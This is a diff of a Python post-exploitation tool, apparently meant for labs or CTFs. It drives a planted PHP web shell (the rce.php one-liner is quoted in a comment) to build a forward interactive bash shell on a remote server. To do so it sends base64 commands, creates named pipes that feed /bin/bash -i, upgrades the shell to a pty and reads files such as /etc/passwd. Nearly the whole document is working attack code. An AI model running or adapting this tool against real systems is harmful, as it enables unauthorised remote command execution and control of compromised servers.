@@ -4,7 +4,7 @@
 
 """
 What the fuck is going wrong with env/pwd/whoami cmd?
-# env, pwd, whoami --> echo unquotted cmd > fifo
+# env, pwd, whoami --> echo cmd > fifo
 # others cmd --> echo "cmd" > fifo
 """
 
@@ -16,13 +16,23 @@ from base64 import b64encode
 from termcolor import colored
 
 
-WRITABLE_FOLDER     = '/tmp' # Prefer /dev/shm if write permission is set to your current user
-BEACONING_DELAY     = .3 # secs
-UPGRADE_CMD_DELAY   = 2 # secs
+WRITABLE_FOLDER = '/tmp'  # Prefer /dev/shm if write permission is set to your current user
+BEACONING_DELAY = .3   # secs
+UPGRADE_CMD_DELAY = 2  # secs
 
-WTF_CMD             = ['env', 'pwd', 'whoami']
+WTF_CMD = ['env', 'pwd', 'whoami']
 
-def execute(cmd, verbose=False, timeout=None):
+
+def execute(cmd, timeout=None, verbose=False):
+    """
+    :cmd      Raw shell command to execute on the remote system
+    :timetout MANDATORY: Used to kill the shell execution loop (started after the named pipe creation).
+              If you cannot use timeout, put the named pipe creation in a separated thread.
+    :verbose  Print full cmd executed on the remote system (Debug mode)
+
+    execute(...) -> return string that is raw output of cmd
+    """
+
     if verbose:
         pcmd = colored(cmd, 'white', 'on_red')
         print("Executing %s" % (pcmd))
@@ -33,7 +43,11 @@ def execute(cmd, verbose=False, timeout=None):
     cmd = b64encode(cmd.encode()).decode()
 
     # rce.php --> <?php @system(base64_decode($_REQUEST['cmd'])); ?>
-    r = requests.get('http://pwn:54345/rce.php?cmd=%s' % (cmd), timeout=timeout)
+    try:
+        r = requests.get('http://pwn:54345/ppwnme/rce.php?cmd=%s' % (cmd), timeout=timeout)
+    except requests.exceptions.Timeout:
+        return None
+
     return r.text.strip()
 
 
@@ -49,7 +63,7 @@ class GetOutput(Thread):
     def read_output(self):
         out = execute('cat %s/out.%d' % (WRITABLE_FOLDER, self.sessid))
         if out != '':
-            execute('echo '' > %s/out.%d' % (WRITABLE_FOLDER, self.sessid)) # Clean output for next GetOutput request
+            execute('echo '' > %s/out.%d' % (WRITABLE_FOLDER, self.sessid))  # Clean output for next GetOutput request
             return out
         return None
 
@@ -62,34 +76,34 @@ class GetOutput(Thread):
             if out:
                 if self.rflbp:
                     out = '\n'.join(out.split('\n')[1:])
+                else:
+                    self.rflbp = True
                 print('%s ' % (out), end='')
             time.sleep(BEACONING_DELAY)
 
+
 class NamedPipe(object):
-    def __init__(self):
-        self.sessid = randint(1000,100000)
+    def __init__(self, timeout=3.5):
+        self.sessid = randint(1000, 100000)
+        self.timeout = timeout
 
     def create(self):
+        # cmd = "mkfifo {F}/in.{id}; (tail -f {F}/in.{id} | /bin/bash -i > {F}/out.{id} 2>&1)".format(F=WRITABLE_FOLDER, id=self.sessid)
         cmd = "mkfifo {F}/in.{id}".format(F=WRITABLE_FOLDER, id=self.sessid)
         execute(cmd)
-        # cmd = "tail -f {F}/in.{id} | /bin/sh -i > {F}/out.{id} 2>&1".format(F=WRITABLE_FOLDER, id=self.sessid)
         cmd = "tail -f {F}/in.{id} | /bin/bash -i > {F}/out.{id} 2>&1".format(F=WRITABLE_FOLDER, id=self.sessid)
-        try:
-            # Blocking request because of the loop command
-            execute(cmd, timeout=2)
-        except requests.exceptions.Timeout:
-            # print("NamedPipe request timeout, ready to go!")
-            pass
+        execute(cmd, timeout=self.timeout)
 
     def clean(self):
         cmd = 'rm {F}/in.{id} {F}/out.{id}'.format(F=WRITABLE_FOLDER, id=np.sessid)
         execute(cmd)
 
     def kill_process(self):
-        cmd = "kill -9 $(ps aux | grep -E -m1 '(in|out)\.%s'|awk -F ' ' '{print $2}')" % (self.sessid)
+        cmd = "kill -9 $(ps aux | grep -E -m1 '(in|out)\\.%s'|awk -F ' ' '{print $2}')" % (self.sessid)
         execute(cmd)
         time.sleep(UPGRADE_CMD_DELAY)
         execute(cmd)
+
 
 class FShell(object):
     def __init__(self, sessid, GetOutputThread):
@@ -106,8 +120,8 @@ class FShell(object):
     def upgrade_shell(self):
         print(colored("Upgrading shell.. (~10 secs)", 'green'))
 
-        # out.rflbp = True
-        out.pause = True
+        # self.out.rflbp = True
+        self.out.pause = True
 
         execute(self.format_cmd('"python -c \'import pty;pty.spawn(\\"/bin/bash\\")\'"'))
         time.sleep(UPGRADE_CMD_DELAY*2)
@@ -118,7 +132,7 @@ class FShell(object):
         execute(self.format_cmd('"alias ll=\'ls -lah\' "'))
         time.sleep(UPGRADE_CMD_DELAY)
 
-        out.pause = False
+        self.out.pause = False
         self.upgraded = True
 
     def run(self):
@@ -126,33 +140,41 @@ class FShell(object):
             try:
                 raw_cmd = input()
             except KeyboardInterrupt:
-                print("\nUse 'exit_shell' command to exit...\n(You're still in the FShell even if you don't see $PS1)")
+                print("\nUse '%s' to quit!\n" % (colored('exit_shell', 'red')))
+                self.ps1()
                 continue
-                # print("\n\nBreaking FShell")
-                # break
 
-            if raw_cmd:
-                if raw_cmd == 'exit_shell':
-                    print("Closing user FShell!")
-                    break
-                elif raw_cmd == 'upgrade_shell':
-                    if not self.upgraded:
-                        self.upgrade_shell()
-                    else:
-                        print(colored("Already upgraded!", 'red'))
-                    continue
-                elif raw_cmd == 'get_sessid':
-                    print(colored('FShell sessid %s' % (self.sessid), 'red'))
-                    continue
-                elif raw_cmd not in WTF_CMD:
-                    raw_cmd = '"%s"' % (raw_cmd)
+            if not raw_cmd:
+                self.ps1()
+                continue
+            elif raw_cmd == 'exit_shell':
+                print("Closing user FShell!")
+                break
+            elif raw_cmd == 'upgrade_shell':
+                if not self.upgraded:
+                    self.upgrade_shell()
+                else:
+                    print(colored("Already upgraded!", 'red'))
+                continue
+            elif raw_cmd == 'get_sessid':
+                print(colored('FShell sessid %s' % (self.sessid), 'red'))
+                self.ps1()
+                continue
+            elif raw_cmd == 'help_shell':
+                self.print_help()
+                self.ps1()
+                continue
+            elif raw_cmd not in WTF_CMD:
+                raw_cmd = '"%s"' % (raw_cmd)
 
-                execute(self.format_cmd(raw_cmd)) #, True) # Debug mode
-                time.sleep(.2) # Wait for response
+            execute(self.format_cmd(raw_cmd))  # , True) # Debug mode
+            time.sleep(.2)  # restore remote PS1 before input() again
 
-        print("Closing remote shell(s)..")
-        out.stop = True
+        print("Closing remote shell..")
+        self.close_shell()
 
+    def close_shell(self):
+        self.out.stop = True
         if self.upgraded:
             execute(self.format_cmd('exit ;'))
             time.sleep(UPGRADE_CMD_DELAY)
@@ -160,14 +182,27 @@ class FShell(object):
             time.sleep(UPGRADE_CMD_DELAY)
         execute(self.format_cmd('exit ;'))
 
+    def print_help(self):
+        print(
+        """
+        get_sessid:     Print session id (/WRITABLE_FOLDER/{in,out}.{sessid} files on the remote system)
+        upgrade_shell:  Upgrade to tty using python pty and bash
+        exit_shell:     Send 3 exit command if shell is upgraded, 1 if not
+        """)
+
+    def ps1(self):
+        print("$> ", end='')
+
+
 def advertise():
-    # WARNING = "WARNING! If you don't get any response back, try to add a space and/or semi colon at the end of your command.\nEg. 'cat /etc/passwd' --> 'cat /etc/passwd ;'"
-    # print(colored(WARNING, 'white', 'on_red'))
     WARNING = "WARNING! If you don't get any response back, try to add a space and/or semi colon at the end of your command."
-    print(colored(WARNING, 'white', 'on_red'))
-    print(colored("Eg. 'cat /etc/passwd' --> 'cat /etc/passwd ;'", 'white', 'on_red'))
+    WARNING_2 = "Eg. 'cat /etc/passwd' --> 'cat /etc/passwd ;'"
     UPGRADE_MSG = "Use '%s' command to get interactive tty on the remote server" % (colored('upgrade_shell', 'red'))
+
+    print(colored(WARNING, 'white', 'on_red'))
+    print(colored(WARNING_2, 'white', 'on_red'))
     print("\n%s\n" % (UPGRADE_MSG))
+
 
 if __name__ == '__main__':
     advertise()
@@ -184,7 +219,10 @@ if __name__ == '__main__':
     out.start()
 
     shell = FShell(np.sessid, out)
-    shell.run() # Pop the shell
+    shell.run()  # Pop the shell
+
+    print("Killing loop process!")
+    np.kill_process()
 
     print("Cleaning sessions files on the remote server...")
     np.clean()
@@ -193,6 +231,4 @@ if __name__ == '__main__':
         print("Waiting for 'GetOutput' thread...")
         time.sleep(1)
 
-    print("Killing loop process!")
-    np.kill_process()
     print("See you soon !")
